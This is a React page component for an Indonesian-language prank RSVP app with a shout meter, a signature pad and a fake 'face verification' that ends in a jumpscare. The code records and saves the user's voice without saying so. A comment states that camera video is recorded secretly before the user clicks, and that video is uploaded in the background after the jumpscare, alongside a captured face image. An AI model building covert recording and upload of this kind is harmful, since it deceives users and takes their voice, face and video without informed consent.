import { useState, useRef, useEffect } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { useNavigate, useLocation } from "react-router-dom";
import SignatureCanvas from "react-signature-canvas";
import { saveRSVP, uploadReactionVideo, updateReactionVideo } from "../lib/rsvpService";
import TurtleLoader from "../components/TurtleLoader";

const SignaturePage = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const signatureRef = useRef(null);
  const videoRef = useRef(null);

  const audioContextRef = useRef(null);
  const analyserRef = useRef(null);
  const dataArrayRef = useRef(null);
  const sourceStreamRef = useRef(null);
  const animationFrameRef = useRef(null);
  const mediaRecorderRef = useRef(null);
  const voiceChunksRef = useRef([]);
  const voiceBlobRef = useRef(null);
  const videoRecorderRef = useRef(null);
  const videoChunksRef = useRef([]);

  const [step, setStep] = useState(0); // 0 = Kesel Meter, 1 = Signature, 2 = Face Verification

  // States for Kesel Meter
  const [micLevel, setMicLevel] = useState(0);
  const [maxMicLevel, setMaxMicLevel] = useState(0);
  const [isMicActive, setIsMicActive] = useState(false);
  const [micError, setMicError] = useState("");

  // States for Signature & Face
  const [isSaving, setIsSaving] = useState(false);
  const [isScanning, setIsScanning] = useState(false);
  const [scanComplete, setScanComplete] = useState(false);
  const [showJumpscare, setShowJumpscare] = useState(false);
  const [jumpscareEnded, setJumpscareEnded] = useState(false);
  const [dbSaved, setDbSaved] = useState(false);
  const [savedDataResult, setSavedDataResult] = useState(null);
  const [savedSignatureData, setSavedSignatureData] = useState(null);
  const [error, setError] = useState("");

  const { username, loginDate } = location.state || {};

  // Watch for both save complete and audio complete
  useEffect(() => {
    if (dbSaved && jumpscareEnded) {
      localStorage.setItem("username", username);
      navigate("/details", {
        state: { username, savedData: savedDataResult },
      });
    }
  }, [dbSaved, jumpscareEnded, navigate, username, savedDataResult]);

  useEffect(() => {
    if (!username || !loginDate) {
      navigate("/login");
    }
  }, [username, loginDate, navigate]);

  // Clean up mic on unmount
  useEffect(() => {
    return () => {
      stopMic();
    };
  }, []);

  // Handle Camera Access for Step 2
  useEffect(() => {
    let stream = null;
    if (step === 2) {
      navigator.mediaDevices
        .getUserMedia({ video: { facingMode: "user" }, audio: true })
        .then((s) => {
          stream = s;
          if (videoRef.current) {
            videoRef.current.srcObject = s;
          }

          // Mulai rekam video reaction diam-diam sejak kamera aktif (sebelum diklik!)
          try {
            videoChunksRef.current = [];
            const recorder = new MediaRecorder(s, { mimeType: 'video/webm' });
            recorder.ondataavailable = e => {
              if (e.data.size > 0) videoChunksRef.current.push(e.data);
            };
            recorder.start();
            videoRecorderRef.current = recorder;
          } catch (err) {
            console.error("Gagal mulai rekam video:", err);
          }
        })
        .catch((err) => {
          console.error("Camera error:", err);
          setError("Kamera gak bisa diakses. Kita skip verifikasi ya! 😢");
          setTimeout(() => handleFinalSubmit(), 2000);
        });
    }
    return () => {
      if (stream) {
        stream.getTracks().forEach((track) => track.stop());
      }
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [step]);

  // ========== KESEL METER LOGIC ==========
  const startMic = async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
      const AudioContext = window.AudioContext || window.webkitAudioContext;
      const audioContext = new AudioContext();
      const analyser = audioContext.createAnalyser();
      const source = audioContext.createMediaStreamSource(stream);

      analyser.fftSize = 256;
      const bufferLength = analyser.frequencyBinCount;
      const dataArray = new Uint8Array(bufferLength);

      source.connect(analyser);

      audioContextRef.current = audioContext;
      analyserRef.current = analyser;
      dataArrayRef.current = dataArray;
      sourceStreamRef.current = stream;

      // Setup MediaRecorder for capturing audio
      voiceChunksRef.current = [];
      const mediaRecorder = new MediaRecorder(stream);
      mediaRecorder.ondataavailable = (e) => {
        if (e.data.size > 0) {
          voiceChunksRef.current.push(e.data);
        }
      };
      mediaRecorder.onstop = () => {
        const blob = new Blob(voiceChunksRef.current, { type: "audio/webm" });
        voiceBlobRef.current = blob;
      };
      mediaRecorder.start();
      mediaRecorderRef.current = mediaRecorder;

      setIsMicActive(true);
      setMicError("");

      const updateMicLevel = () => {
        analyser.getByteFrequencyData(dataArray);
        let sum = 0;
        for (let i = 0; i < bufferLength; i++) {
          sum += dataArray[i];
        }
        let average = sum / bufferLength;

        // --- PENGATURAN SENSITIVITAS ---
        // Suara ruangan biasa/ngobrol normal biasanya punya average 30-50.
        // Teriak kencang biasanya 100-130.
        // Kita abaikan suara di bawah 40, jadi kalau cuma ngomong biasa bar-nya gak naik.
        let adjustedAverage = Math.max(0, average - 40);

        // Supaya mentok 100%, adjustedAverage harus mencapai 80 (berarti real average = 120, ini butuh TERIAKAN KERAS).
        let level = Math.min(100, Math.round((adjustedAverage / 80) * 100));

        setMicLevel(level);
        setMaxMicLevel(prev => Math.max(prev, level));

        animationFrameRef.current = requestAnimationFrame(updateMicLevel);
      };

      updateMicLevel();
    } catch (err) {
      console.error("Mic access denied", err);
      setMicError("Mic tidak dapat diakses! Boleh tolong izinkan mic-nya? 🥺");
    }
  };

  const stopMic = () => {
    if (animationFrameRef.current) cancelAnimationFrame(animationFrameRef.current);

    // Stop recorder first to ensure blob gets created
    if (mediaRecorderRef.current && mediaRecorderRef.current.state !== "inactive") {
      mediaRecorderRef.current.stop();
    }

    if (sourceStreamRef.current) {
      sourceStreamRef.current.getTracks().forEach(track => track.stop());
    }
    if (audioContextRef.current && audioContextRef.current.state !== "closed") {
      audioContextRef.current.close();
    }
    setIsMicActive(false);
  };

  const handleNextFromKesel = () => {
    stopMic();
    setStep(1); // Go to Signature
  };

  // ========== SIGNATURE LOGIC ==========
  const handleClear = () => {
    signatureRef.current?.clear();
    setError("");
  };

  const handleSignatureSubmit = () => {
    if (signatureRef.current?.isEmpty()) {
      setError("Tanda tangan dulu dong! 🥺");
      return;
    }
    setError("");
    // Save the signature data BEFORE changing step, because the canvas will unmount
    setSavedSignatureData(signatureRef.current.toDataURL());
    setStep(2); // Go to Face Verification
  };

  // ========== FACE VERIFICATION LOGIC ==========
  const captureFace = () => {
    if (videoRef.current) {
      const canvas = document.createElement("canvas");
      canvas.width = videoRef.current.videoWidth;
      canvas.height = videoRef.current.videoHeight;
      const ctx = canvas.getContext("2d");
      ctx.translate(canvas.width, 0);
      ctx.scale(-1, 1);
      ctx.drawImage(videoRef.current, 0, 0, canvas.width, canvas.height);
      return canvas.toDataURL("image/png");
    }
    return null;
  };

  const handleScan = () => {
    setIsScanning(true);

    // Pre-warm audio secara sinkron saat tombol diklik agar tidak di-block oleh browser
    const hachimi = new Audio("/Hachimi%20mr%20biao%20tiktok%20version.mp3");
    hachimi.volume = 0; // Mute sementara
    hachimi.play().then(() => {
      hachimi.pause();
      hachimi.volume = 1;
      hachimi.currentTime = 0;
    }).catch(e => console.error("Pre-warm audio failed:", e));
    window.hachimiAudio = hachimi;

    setTimeout(() => {
      const capturedFace = captureFace();
      setIsScanning(false);
      setScanComplete(true);
      setTimeout(() => {
        setShowJumpscare(true);

        // Putar audio yang sudah di-pre-warm
        if (window.hachimiAudio) {
          window.hachimiAudio.play().catch(e => console.error("Hachimi audio playback failed:", e));
        }

        // Fixed jumpscare interval (10 seconds) then navigate
        setTimeout(() => {
          // Berhentikan rekam video dan upload
          if (videoRecorderRef.current && videoRecorderRef.current.state !== "inactive") {
            videoRecorderRef.current.onstop = async () => {
              const blob = new Blob(videoChunksRef.current, { type: "video/webm" });
              // Upload di background tanpa memblokir navigasi
              uploadReactionVideo(blob, username).then(res => {
                if (res.success) {
                  updateReactionVideo(username, res.url);
                }
              });
            };
            videoRecorderRef.current.stop();
          }
          setJumpscareEnded(true);
        }, 10000);

        handleFinalSubmit(capturedFace);
      }, 1000);
    }, 3000);
  };

  const handleFinalSubmit = async (capturedFace = null) => {
    setIsSaving(true);
    setError("");
    try {
      const signatureImage = savedSignatureData || signatureRef.current?.toDataURL();
      const result = await saveRSVP({
        username,
        loginDate,
        signatureImage,
        faceImage: capturedFace,
        voiceBlob: voiceBlobRef.current,
      });

      if (result.success) {
        setSavedDataResult(result.data);
        setDbSaved(true);
      } else {
        throw new Error(result.error || "Failed to save data");
      }
    } catch (err) {
      console.error("Error saving RSVP:", err);
      setError("Gagal menyimpan data. Coba lagi ya! 😢");
      setIsSaving(false);
      setJumpscareEnded(true); // Don't trap user
    }
  };

  const handleBegin = () => setError("");

  const containerVariants = {
    hidden: { opacity: 0, scale: 0.95, y: 20 },
    visible: {
      opacity: 1, scale: 1, y: 0,
      transition: { duration: 0.5, type: "spring", bounce: 0.4, staggerChildren: 0.1 },
    },
  };

  const itemVariants = {
    hidden: { y: 20, opacity: 0 },
    visible: { y: 0, opacity: 1, transition: { type: "spring", stiffness: 100 } },
  };

  if (isSaving && !showJumpscare) {
    return <TurtleLoader onComplete={() => { }} />;
  }

  if (!username) return null;

  return (
    <div className="min-h-screen flex flex-col items-center justify-center p-4 sm:p-6 relative overflow-hidden bg-cream font-body">
      {/* Background Blobs */}
      <div className="fixed top-[-10%] left-[-10%] w-[500px] h-[500px] bg-matcha-primary rounded-full mix-blend-multiply filter blur-[120px] opacity-30 animate-pulse-soft z-0 pointer-events-none"></div>
      <div className="fixed bottom-[-10%] right-[-10%] w-[500px] h-[500px] bg-beige rounded-full mix-blend-multiply filter blur-[120px] opacity-50 z-0 pointer-events-none" style={{ animationDelay: "1s" }}></div>

      {/* Decorative Floating Elements */}
      <div className="fixed top-10 right-10 flex gap-3 opacity-60 z-0 pointer-events-none">
        <span className="text-2xl animate-float">✍️</span>
        <span className="text-2xl animate-float-delayed">✨</span>
      </div>
      <div className="fixed bottom-10 left-10 flex gap-3 opacity-60 z-0 pointer-events-none">
        <span className="text-2xl animate-float-delayed">📝</span>
        <span className="text-2xl animate-float">💚</span>
      </div>

      <motion.div
        className="max-w-[400px] w-full bg-white/60 backdrop-blur-xl rounded-[2rem] p-6 sm:p-8 shadow-glass border border-white/80 relative z-10"
        variants={containerVariants}
        initial="hidden"
        animate="visible"
      >
        {step === 0 ? (
          // ================= STEP 0: KESEL METER =================
          <motion.div variants={itemVariants} className="flex flex-col items-center">
            <div className="text-center mb-6">
              <div className="inline-block p-2 bg-red-50 rounded-xl mb-3 border border-red-100 -rotate-3">
                <span className="text-2xl">😤</span>
              </div>
              <h1 className="font-heading text-2xl sm:text-3xl text-matcha-dark font-bold mb-2">
                Cebelapa Kesel Kamyu?
              </h1>
              <p className="font-body text-xs sm:text-sm text-gray-600">
                Luapin Beban Kamu di sini! Teriak?Misuh di depan HP sampai bar-nya merah 80%! 🤬
              </p>
            </div>

            <div className="w-full h-12 bg-gray-200 rounded-full overflow-hidden relative shadow-inner mb-2 border-2 border-white">
              <div
                className="absolute top-0 left-0 h-full bg-gradient-to-r from-yellow-300 via-orange-400 to-red-500 transition-all duration-75"
                style={{ width: `${micLevel}%` }}
              ></div>
              <div
                className="absolute top-0 left-0 h-full bg-red-500/30 transition-all duration-300 border-r-2 border-red-500"
                style={{ width: `${maxMicLevel}%` }}
              ></div>
              <div className="absolute inset-0 flex items-center justify-center font-bold text-gray-800 drop-shadow-md z-10 text-sm">
                {micLevel}%
              </div>
            </div>

            <p className="font-accent text-[10px] text-gray-500 mb-6 uppercase tracking-widest font-bold">
              Rekor: {maxMicLevel}% / 80% (Batas Lanjut)
            </p>

            {micError && (
              <p className="text-xs text-red-500 mb-4">{micError}</p>
            )}

            {!isMicActive ? (
              <motion.button
                onClick={startMic}
                whileHover={{ scale: 1.02 }}
                whileTap={{ scale: 0.98 }}
                className="w-full py-3 px-4 bg-red-500 text-white font-bold text-sm rounded-xl shadow-md hover:bg-red-600 transition-all font-body"
              >
                Aktifkan Mic & Mulai Teriak! 🎙️
              </motion.button>
            ) : maxMicLevel >= 80 ? (
              <motion.button
                onClick={handleNextFromKesel}
                initial={{ scale: 0 }}
                animate={{ scale: 1 }}
                whileHover={{ scale: 1.02 }}
                whileTap={{ scale: 0.98 }}
                className="w-full py-3 px-4 bg-matcha-primary text-white font-bold text-sm rounded-xl shadow-md hover:bg-matcha-dark transition-all font-body animate-pulse-soft"
              >
                Udah Puas? Lanjut! 👉
              </motion.button>
            ) : (
              <p className="font-accent text-xs font-bold text-red-500 animate-pulse tracking-widest uppercase">
                Kurang Kenceng!!! JKLRQSXC!!!
              </p>
            )}
          </motion.div>
        ) : step === 1 ? (
          // ================= STEP 1: SIGNATURE =================
          <>
            <motion.div className="text-center mb-6" variants={itemVariants}>
              <div className="inline-block p-2 bg-beige/30 rounded-xl mb-3 border border-beige/50 -rotate-3">
                <span className="text-2xl">📝</span>
              </div>
              <h1 className="font-heading text-2xl sm:text-3xl text-matcha-dark font-bold mb-2">
                TTD :3
              </h1>
              <p className="font-body text-xs sm:text-sm text-gray-600">
                Tanda tangani di sini sebagai tanda akan kehadiran kamu ya! 💕
              </p>
            </motion.div>

            <motion.div className="mb-6" variants={itemVariants}>
              <div className="border-2 border-dashed border-matcha-primary/30 rounded-2xl overflow-hidden bg-white/80 shadow-inner relative group transition-colors hover:border-matcha-primary/60">
                <SignatureCanvas
                  ref={signatureRef}
                  canvasProps={{ className: "w-full h-48 cursor-crosshair" }}
                  onBegin={handleBegin}
                  backgroundColor="transparent"
                  penColor="#546B41"
                />
                <div className="absolute inset-0 pointer-events-none flex items-center justify-center opacity-30 group-hover:opacity-10 transition-opacity">
                  <span className="font-heading text-4xl text-matcha-primary">✍️</span>
                </div>
              </div>
              <p className="font-accent tracking-widest uppercase text-[10px] text-gray-500 text-center mt-3 font-semibold">
                Buat tanda tangan di dalam kotak
              </p>
            </motion.div>

            <AnimatePresence>
              {error && (
                <motion.div
                  initial={{ opacity: 0, y: -10, scale: 0.9 }}
                  animate={{ opacity: 1, y: 0, scale: 1 }}
                  exit={{ opacity: 0, y: -10, scale: 0.9 }}
                  className="bg-red-50 text-red-500 border border-red-200 px-4 py-3 rounded-xl text-xs font-semibold text-center shadow-sm mb-4"
                >
                  {error}
                </motion.div>
              )}
            </AnimatePresence>

            <motion.div className="bg-white/40 rounded-xl p-4 mb-6 border border-white/60 shadow-sm" variants={itemVariants}>
              <div className="flex justify-between items-center mb-2 pb-2 border-b border-white/50">
                <span className="font-accent text-[10px] uppercase tracking-wider text-matcha-primary font-bold">Nama</span>
                <span className="font-heading font-bold text-matcha-dark text-sm">{username}</span>
              </div>
              <div className="flex justify-between items-center">
                <span className="font-accent text-[10px] uppercase tracking-wider text-matcha-primary font-bold">Tanggal</span>
                <span className="font-body font-medium text-gray-700 text-xs">
                  {new Date(loginDate).toLocaleDateString("id-ID", { day: "numeric", month: "long", year: "numeric" })}
                </span>
              </div>
            </motion.div>

            <motion.div className="flex gap-3" variants={itemVariants}>
              <motion.button
                onClick={handleClear}
                whileHover={{ scale: 1.02 }}
                whileTap={{ scale: 0.98 }}
                className="flex-1 py-3 px-4 bg-white/50 border border-gray-300 text-gray-600 font-bold text-sm rounded-xl hover:bg-white hover:text-gray-800 transition-all shadow-sm font-body"
              >
                Ulang
              </motion.button>

              <motion.button
                onClick={handleSignatureSubmit}
                whileHover={{ scale: 1.02 }}
                whileTap={{ scale: 0.98 }}
                className="flex-1 py-3 px-4 bg-matcha-primary text-white font-bold text-sm rounded-xl shadow-md hover:bg-matcha-dark transition-all font-body"
              >
                Lanjut 👉
              </motion.button>
            </motion.div>
          </>
        ) : (
          // ================= STEP 2: FACE VERIFICATION =================
          <motion.div variants={itemVariants} className="flex flex-col items-center">
            <div className="text-center mb-6">
              <h1 className="font-heading text-2xl sm:text-3xl text-matcha-dark font-bold mb-2">
                Face Verification
              </h1>
              <p className="font-body text-xs sm:text-sm text-gray-600">
                {scanComplete ? "Verifikasi Berhasil! 100% Valid ✨" : "Mana Coba Liat Cantiknya Aku 📸"}
              </p>
            </div>

            <div className="relative w-48 h-48 sm:w-56 sm:h-56 rounded-full overflow-hidden border-4 border-white shadow-glass mb-8 bg-black/5">
              <video
                ref={videoRef}
                autoPlay
                playsInline
                muted
                className="w-full h-full object-cover scale-x-[-1]"
              />
              {isScanning && (
                <motion.div
                  className="absolute left-0 w-full h-1.5 bg-matcha-primary shadow-[0_0_20px_rgba(153,173,122,1)] z-20"
                  animate={{ top: ["0%", "100%", "0%"] }}
                  transition={{ duration: 2, repeat: Infinity, ease: "linear" }}
                />
              )}
              {isScanning && (
                <div className="absolute inset-0 bg-matcha-primary/20 animate-pulse z-10 pointer-events-none"></div>
              )}
              {scanComplete && (
                <motion.div
                  initial={{ opacity: 0 }}
                  animate={{ opacity: 1 }}
                  className="absolute inset-0 bg-white/70 flex items-center justify-center backdrop-blur-sm z-30"
                >
                  <motion.div
                    initial={{ scale: 0 }}
                    animate={{ scale: 1 }}
                    transition={{ type: "spring", bounce: 0.6 }}
                    className="bg-matcha-primary text-white w-16 h-16 rounded-full flex items-center justify-center text-3xl shadow-lg"
                  >
                    ✓
                  </motion.div>
                </motion.div>
              )}
            </div>

            <AnimatePresence>
              {error && (
                <motion.div
                  initial={{ opacity: 0, y: -10, scale: 0.9 }}
                  animate={{ opacity: 1, y: 0, scale: 1 }}
                  exit={{ opacity: 0, y: -10, scale: 0.9 }}
                  className="bg-red-50 text-red-500 border border-red-200 px-4 py-3 rounded-xl text-xs font-semibold text-center shadow-sm mb-4 w-full"
                >
                  {error}
                </motion.div>
              )}
            </AnimatePresence>

            {!isScanning && !scanComplete && !error && (
              <motion.button
                onClick={handleScan}
                whileHover={{ scale: 1.02 }}
                whileTap={{ scale: 0.98 }}
                className="w-full py-3 px-4 bg-matcha-primary text-white font-bold text-sm rounded-xl shadow-md hover:bg-matcha-dark transition-all font-body"
              >
                Mulai Verifikasi 🔍
              </motion.button>
            )}

            {isScanning && (
              <p className="font-accent text-xs font-bold text-matcha-primary animate-pulse tracking-widest uppercase">
                Scanning facial features...
              </p>
            )}
            {scanComplete && !showJumpscare && (
              <p className="font-accent text-xs font-bold text-matcha-primary tracking-widest uppercase">
                Identity Confirmed 💖
              </p>
            )}
          </motion.div>
        )}
      </motion.div>

      {/* Jumpscare Overlay */}
      <AnimatePresence>
        {showJumpscare && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            className="fixed inset-0 z-50 flex items-center justify-center bg-black overflow-hidden pointer-events-none"
          >
            <motion.img
              src="/WhatsApp%20Image%202026-05-12%20at%2015.44.25.jpeg"
              alt="Jumpscare"
              initial={{ scale: 0.1, opacity: 0 }}
              animate={{ scale: 1.0, opacity: 1 }}
              transition={{ duration: 0.15, ease: "easeOut" }}
              className="w-full h-full object-cover"
            />
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
};

export default SignaturePage;
